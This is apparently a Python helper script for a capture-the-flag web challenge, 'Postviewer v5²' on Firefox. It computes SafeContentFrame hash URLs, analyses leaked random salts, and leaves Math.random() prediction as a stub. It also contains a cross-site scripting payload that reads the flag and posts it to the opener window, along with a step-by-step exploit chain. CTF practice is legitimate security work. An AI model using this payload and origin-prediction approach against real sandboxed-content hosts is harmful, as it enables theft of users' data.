#!/usr/bin/env python3
"""
Postviewer v5² (FF) Helper Script
Helps with Math.random() prediction and exploit automation
"""

import hashlib
import base64
import json

def calculate_scf_hash(product, salt, origin):
    """
    Calculate the SafeContentFrame hash
    hash = SHA256(product + "$@#|" + salt + "$@#|" + origin)
    """
    # Concatenate with delimiter
    data = product.encode() + b"$@#|" + salt + b"$@#|" + origin.encode()
    
    # Calculate SHA-256
    hash_bytes = hashlib.sha256(data).digest()
    
    # Convert to base36
    hash_int = int.from_bytes(hash_bytes, 'big')
    hash_b36 = to_base36(hash_int)
    
    # Pad to 50 characters
    hash_b36 = hash_b36.zfill(50)[:50]
    
    return hash_b36

def to_base36(num):
    """Convert number to base36 string"""
    if num == 0:
        return '0'
    
    digits = '0123456789abcdefghijklmnopqrstuvwxyz'
    result = ''
    
    while num > 0:
        result = digits[num % 36] + result
        num //= 36
    
    return result

def from_base36(s):
    """Convert base36 string to number"""
    return int(s, 36)

def analyze_leaked_salt(salt_bytes):
    """
    Analyze a leaked salt to understand its structure
    """
    print(f"[*] Analyzing salt...")
    print(f"    Length: {len(salt_bytes)} bytes")
    
    # Convert to string
    try:
        salt_str = bytes(salt_bytes).decode('utf-8')
        print(f"    String: {salt_str}")
        print(f"    String length: {len(salt_str)} chars")
    except:
        print(f"    Cannot decode as UTF-8")
        salt_str = None
    
    # The salt from getRandom(5) should be alphanumeric
    if salt_str:
        print(f"    Alphanumeric: {salt_str.isalnum()}")
        
        # Try to identify the 5 random components
        # Each Math.random().toString(36).slice(2) produces a variable-length string
        print(f"\n[*] This salt was generated from 5 Math.random() calls")
        print(f"    To predict future salts, we need to:")
        print(f"    1. Reverse the base36 encoding")
        print(f"    2. Recover the Math.random() state")
        print(f"    3. Predict future random numbers")
    
    return salt_str

def generate_scf_url(product, salt, origin):
    """
    Generate the full SafeContentFrame URL
    """
    hash_val = calculate_scf_hash(product, salt, origin)
    url = f"https://{hash_val}-h748636364.scf.usercontent.goog/{product}/shim.html?origin={origin}"
    return url

def test_scf_calculation():
    """
    Test the SCF hash calculation
    """
    print("[*] Testing SCF hash calculation...")
    
    product = "google-ctf"
    origin = "https://wl3zck2n-postviewer5-ff.instancer.2025.ctfcompetition.com"
    salt = b"test123"
    
    hash_val = calculate_scf_hash(product, salt, origin)
    print(f"    Product: {product}")
    print(f"    Origin: {origin}")
    print(f"    Salt: {salt}")
    print(f"    Hash: {hash_val}")
    
    url = generate_scf_url(product, salt, origin)
    print(f"    URL: {url}")

def predict_math_random_firefox(leaked_salts):
    """
    Predict future Math.random() values for Firefox
    This is a placeholder - actual implementation would use a proper predictor
    """
    print("[*] Math.random() prediction for Firefox")
    print("[!] This requires implementing a Firefox-specific predictor")
    print("[!] See: https://github.com/d0nutptr/v8_rand_buster for reference")
    
    # For now, just analyze what we have
    for i, salt_data in enumerate(leaked_salts):
        print(f"\n[*] Salt {i+1}:")
        analyze_leaked_salt(salt_data['salt'])

def create_xss_payload(predicted_salt):
    """
    Create an XSS payload that will execute on the predicted salt's origin
    """
    payload = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS Payload</title>
</head>
<body>
    <h1>XSS Payload Active</h1>
    <script>
        // This executes on the secure origin
        console.log('XSS payload executed!');
        console.log('Origin:', window.origin);
        
        // Try to access the flag
        window.onmessage = (e) => {{
            if (e.data && e.data.body) {{
                // We received file data
                const flagContent = new TextDecoder().decode(e.data.body);
                console.log('Flag content:', flagContent);
                
                // Exfiltrate to opener
                if (window.opener) {{
                    window.opener.postMessage({{
                        type: 'flag',
                        content: flagContent
                    }}, '*');
                }}
            }}
        }};
        
        // Also try to read document content after it loads
        setTimeout(() => {{
            const content = document.body.textContent;
            if (content && content.includes('CTF{{')) {{
                console.log('Found flag in document:', content);
                if (window.opener) {{
                    window.opener.postMessage({{
                        type: 'flag',
                        content: content
                    }}, '*');
                }}
            }}
        }}, 2000);
    <\/script>
</body>
</html>"""
    
    return payload

def main():
    print("=" * 60)
    print("Postviewer v5² (FF) Helper Script")
    print("=" * 60)
    
    # Test SCF calculation
    test_scf_calculation()
    
    print("\n" + "=" * 60)
    print("Usage:")
    print("=" * 60)
    print("1. Run the HTML exploit to leak salts")
    print("2. Use this script to analyze leaked salts")
    print("3. Implement Math.random() prediction")
    print("4. Generate XSS payload with predicted salt")
    print("5. Share XSS payload as cached file")
    print("6. Trigger flag rendering")
    print("7. XSS executes and exfiltrates flag")
    
    print("\n[*] Example leaked salt analysis:")
    example_salt = [97, 98, 99, 100, 101, 102, 103, 104, 105]  # "abcdefghi"
    analyze_leaked_salt(example_salt)

if __name__ == "__main__":
    main()
